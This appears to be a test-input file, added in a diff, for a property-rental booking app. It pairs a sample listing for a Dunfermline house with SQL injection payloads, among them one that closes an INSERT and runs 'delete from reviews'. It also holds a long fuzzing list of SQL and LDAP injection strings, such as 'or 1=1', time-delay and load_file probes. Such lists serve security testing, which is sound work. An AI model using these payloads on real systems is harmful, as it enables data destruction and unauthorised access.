@@ -1,0 +1,123 @@
+Entire residential home hosted by Anne
+
+Cheerful and bright end terraced family home in the historic town of Dunfermline. The house comprises 3 bedrooms, 2 bathrooms, a fully equipped kitchen and living and dining area. The house is within easy walking distance of ample local shops and amenities, including a bus station. The train station is a 5 minute drive from the house, where you can take the train to Edinburgh in approximately 40 minutes. The house is equally well located for visiting Stirling, Glasgow and Perth.
+
+Dunfermline, Scotland
+
+128 Pittencrieff St
+Dunfermline
+KY12 8AN
+
+01122021
+30112022
+50
+5
+5
+
+
+
+
+hack',1,'hack'); delete from reviews; -- comment
+
+
+
+
+
+"INSERT INTO hosts (publicName, isSuperHost, email) VALUES ('
+
+hack',1,'hack'); delete from reviews;INSERT INTO bookings (startDateBooking, endDateBooking, totalPrice, bookingStatus, propertyID, email) VALUES (2021-12-06, 2021-12-23, 0.0, 'Pending
+
+
+', 0 " + ",'" + email + "');
+
+
+
+hack',1,'hack'); delete from reviews;'
+
+
+
+
+
+<>"'%;)(&+
+|
+!
+?
+/
+//
+//*
+'
+' -- 
+1 or 1=1
+1;SELECT%20*
+1 waitfor delay '0:0:10'--
+'%20or%20''='
+'%20or%201=1
+')%20or%20('x'='x
+'%20or%20'x'='x
+%20or%20x=x
+%20'sleep%2050'
+%20$(sleep%2050)
+%21
+23 OR 1=1
+%26
+%27%20or%201=1
+%28
+%29
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+||6
+'||'6
+(||6)
+%7C
+a'
+admin' or '
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
+' and 1 in (select var from temp)--
+anything' OR 'x'='x
+"a"" or 1=1--"
+a' or 1=1--
+"a"" or 3=3--"
+a' or 3=3--
+a' or 'a' = 'a
+&apos;%20OR
+' having 1=1--
+hi or 1=1 --"
+hi' or 1=1 --
+"hi"") or (""a""=""a"
+hi or a=a
+hi' or 'a'='a
+hi') or ('a'='a
+'hi' or 'x'='x';
+insert
+like
+limit
+*(|(mail=*))
+*(|(objectclass=*))
+or
+' or ''='
+ or 0=0 #"
+' or 0=0 --
+' or 0=0 #
+" or 0=0 --
+or 0=0 --
+or 0=0 #
+' or 1 --'
+' or 1/*
+; or '1'='1'
+' or '1'='1
+' or '1'='1'--
+' or 1=1
+' or 1=1 /*
+' or 1=1--
+' or 1=1-- 
+'/**/or/**/1/**/=/**/1
+‘ or 1=1 --
+" or 1=1--
+or 1=1
+or 1=1--
+ or 1=1 or ""=
+' or 1=1 or ''='
+' or 1 in (select @@version)--
+or%201=1
+or%201=1 --
